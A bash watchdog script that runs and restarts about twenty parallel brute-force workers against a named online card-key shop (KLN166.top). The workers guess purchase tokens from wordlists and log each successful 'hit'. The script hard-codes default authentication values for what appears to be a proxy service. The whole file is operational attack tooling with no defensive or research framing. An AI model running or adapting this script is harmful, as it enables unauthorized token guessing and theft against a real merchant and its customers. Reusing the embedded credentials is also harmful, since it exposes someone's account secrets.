#!/bin/bash
OUT=/data/automation/results/kln166.top/kami_attack_20260718
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
PRI=/data/wordlists/faka/kln166-priority.txt
HEX=/data/wordlists/faka/kln166-hex32-sample.txt
HITS="$OUT/KAMI_HIT.jsonl"
LOG="$OUT/watchdog.log"
WORKERS="${WORKERS:-20}"
CHUNK=1472636
THREADS="${THREADS:-15}"
FAKA_BASE="${FAKA_BASE:-https://KLN166.top/shop/}"
LAST=0

restart_worker() {
  local w=$1 start=$2 chunk=$3 threads=$4 wl=$5
  tmux kill-session -t "kln-api-$w" 2>/dev/null || true
  tmux new-session -d -s "kln-api-$w" \
    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=${QG_AUTHKEY:-C413ED6D} QG_AUTHPWD=${QG_AUTHPWD:-344F550A6F8B} FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
}

while true; do
  TS=$(date '+%H:%M:%S')
  N=$(wc -l < "$HITS" 2>/dev/null || echo 0)
  RATES=$(grep -h "rate=" "$OUT"/api_brute_w*.log "$OUT"/priority.log "$OUT"/hex32.log 2>/dev/null | tail -4)
  CURLS=$(pgrep -c curl 2>/dev/null || echo 0)
  STUCK=$(grep -l "site down" "$OUT"/api_brute_w*.log 2>/dev/null | while read -r f; do
    last=$(tail -1 "$f")
    echo "$last" | grep -q "site down" && basename "$f" .log | sed 's/api_brute_//'
  done | tr '\n' ' ')
  echo "[$TS] hits=$N curls=$CURLS stuck=${STUCK:-none}" >> "$LOG"
  if [ -n "$RATES" ]; then echo "[$TS] $RATES" >> "$LOG"; fi
  if [ "$N" -gt "$LAST" ]; then
    echo "[$TS] *** NEW HIT ***" >> "$LOG"
    tail -1 "$HITS" >> "$LOG"
    LAST=$N
  fi
  for w in $(seq 0 $((WORKERS - 1))); do
    if ! tmux has-session -t "kln-api-$w" 2>/dev/null; then
      echo "[$TS] restart w$w (dead)" >> "$LOG"
      restart_worker "$w" "$((w * CHUNK))" "$CHUNK" "$THREADS" "$WL"
    elif grep -q "site down" "$OUT/api_brute_w${w}.log" 2>/dev/null && \
         ! grep -q "FAST brute" "$OUT/api_brute_w${w}.log" 2>/dev/null; then
      echo "[$TS] restart w$w (stuck)" >> "$LOG"
      restart_worker "$w" "$((w * CHUNK))" "$CHUNK" "$THREADS" "$WL"
    fi
  done
  for pair in "priority:99:$PRI:0:0:25" "hex32:98:$HEX:0:0:25"; do
    IFS=: read -r name wid wl start chunk threads <<< "$pair"
    if ! tmux has-session -t "kln-$name" 2>/dev/null; then
      echo "[$TS] restart $name" >> "$LOG"
      tmux new-session -d -s "kln-$name" \
        "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT QG_AUTHKEY=${QG_AUTHKEY:-C413ED6D} QG_AUTHPWD=${QG_AUTHPWD:-344F550A6F8B} FFFZZ_TURBO=1 python3 $BIN/faka_api_brute_fast.py $wl $start $chunk $threads $wid $OUT 2>&1 | tee -a $OUT/${name}.log"
    fi
  done
  sleep 90
done
